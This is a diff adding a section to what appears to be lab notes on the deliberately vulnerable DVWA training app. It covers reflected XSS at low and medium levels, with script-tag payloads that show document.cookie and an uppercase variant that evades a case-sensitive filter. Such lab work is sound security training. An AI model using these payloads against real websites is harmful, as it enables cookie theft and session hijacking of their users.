@@ -308,3 +308,68 @@ Since `'1'='1'` is always true, this query will return information for all users
  
 ---
 
+
+# Reflected based XSS
+
+<img width="774" alt="Screenshot 2024-05-19 at 5 44 15 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/cbb355ce-bc2a-4a1f-ab36-58bbb4899cf5">
+
+<details>
+
+<summary>low-level</summary>
+
+### XSS - Low level
+
+1. **The URL**:
+    
+    ```php
+    // original URL
+    127.0.0.1/dvwa/vulunerabilities/xss-r/
+    
+    // after input name
+    127.0.0.1/dvwa/vulunerabilities/xss-r/?name=munin#
+    ```
+    
+2. **Testing with inserting javascript into URL**:
+    
+    ```jsx
+    <script> alert(”XSS_Test”) </script>
+    
+    <script> alert(document.cookie) </script>
+    ```
+    
+3. **Vulnerabilities Found**:
+    
+    <img width="1244" alt="Untitled (6)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/984f0103-54fd-4233-bfe4-0c991a2186db">
+
+    <img width="1211" alt="Untitled 9" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/66ce2463-7715-43db-a916-acafe3759629">
+
+    
+</details>
+
+---
+
+<details>
+
+<summary>medium-level</summary>
+
+### XSS - Medium level
+
+1. **Input javascript into URL**:
+    
+    Because from the source code in medium level, it is filtering <script> however it is string and check only small capital letter, Hence we can try capital letter to escape the filtering.
+    
+    ```jsx
+    <SCRIPT> alert("Hello") </SCRIPT>
+    
+    <SCRIPT> alert(document.cookie) </SCRIPT>
+    ```
+    
+2. **Vulnerabilities Found**:
+   
+    <img width="1230" alt="Screenshot_2024-05-17_at_2 57 07_in_the_afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/9ebf671e-f1ca-48d4-a090-2835f7e9da23">
+
+    <img width="1268" alt="Screenshot_2024-05-17_at_2 57 57_in_the_afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/37976eab-6649-4a5d-b64c-2b5a4a37a84a">
+    
+</details>
+
+---
